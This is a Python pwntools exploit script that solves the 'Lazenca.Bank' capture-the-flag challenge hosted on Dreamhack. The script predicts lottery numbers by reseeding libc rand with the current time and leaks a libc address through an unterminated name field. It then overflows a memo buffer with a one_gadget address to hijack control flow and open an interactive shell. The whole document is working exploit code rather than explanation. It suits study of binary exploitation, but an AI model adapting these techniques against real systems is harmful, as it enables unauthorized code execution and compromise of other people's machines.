#!/usr/bin/env python3

from pwn import *

import ctypes
import time

exe = ELF("./Lazenca.Bank_patched")
libc = ELF("./libc-2.31.so")
libc1 = ctypes.CDLL("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+217", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host3.dreamhack.games", 22705)

    return r

def add_user (p, id, password):
    p.sendlineafter (b'Input : ', b'6')
    p.sendlineafter (b'ID : ', id)
    p.sendlineafter (b'Password : ', password)

def login (p, id, password):
    p.sendlineafter (b'Input : ', b'7')
    p.sendlineafter (b'ID : ', id)
    p.sendlineafter (b'Password : ', password)

def loan (p):
    p.sendlineafter (b'Input : ', b'4')

def transfer (p, account_num, amount):
    p.sendlineafter (b'Input : ', b'3')
    p.sendlineafter (b'Enter the account number to be transfer.\n', account_num)
    p.sendlineafter (b'Enter the amount to be transfer.\n', amount)

def edit_memo (p, content):
    p.sendlineafter (b'Input : ', b'7')
    p.sendlineafter (b'Input : ', b'2')
    p.sendlineafter (b'Edit\n', content)
    p.sendlineafter (b'Input : ', b'0')

def VIP (p, account_num, amount):
    p.sendlineafter (b'Input : ', b'8')
    p.sendlineafter (b'Enter the account number to be transfer.\n', account_num)
    p.sendlineafter (b'Enter the amount to be transfer.\n', amount)


def main():
    p = conn()
    add_user (p, b'ndd', b'ndd')
    login (p, b'ndd', b'ndd')
    loan (p)
    p.recvuntil (b'Account number : ')
    p.recvuntil (b'Account number : ')
    loan_acc = (p.recvuntil (b'\n')[:-1])
    print ("The loan accout is : ", loan_acc.decode())
    p.sendlineafter (b'Input : ', b'5')
    
    predicts = []
    now = int(libc1.time(0))
    libc1.srand(now + 1)

    for i in range (7): 
        predict = libc1.rand() % 37 + 1
        predicts.append (predict)
        # print (f'[{i + 1}] is : {predict}')
        
    # p.recvuntil (b'Enter numbers:')
    for i in range (7):
        tmp = b'[' + str (i + 1).encode ('utf-8') + b'] : '
        p.sendlineafter (tmp, str (predicts[i]).encode ('utf-8'))

    p.sendafter (b'Name : ', b'A' * 8)
    p.sendafter (b'Address : ', b'A')
    p.recvuntil (b'Name : ' + b'A' * 8)
    tmp = p.recvuntil (b'\x0a')[:-1]
    libc_leak = u64 (tmp.ljust (8, b'\x00'))
    print ("The leak from libc is: ", hex (libc_leak))
    libc.address = libc_leak - 0x94013
    print ("The address of libc is: ", hex (libc.address))

    for i in range (20):
        transfer (p, loan_acc, b'100')

    one_gadget = libc.address + 0xe6c81

    payload = b'A'* 56 + p64 (one_gadget)
    edit_memo (p, payload)
    VIP (p, loan_acc, b'0')
    p.interactive()


if __name__ == "__main__":
    main()
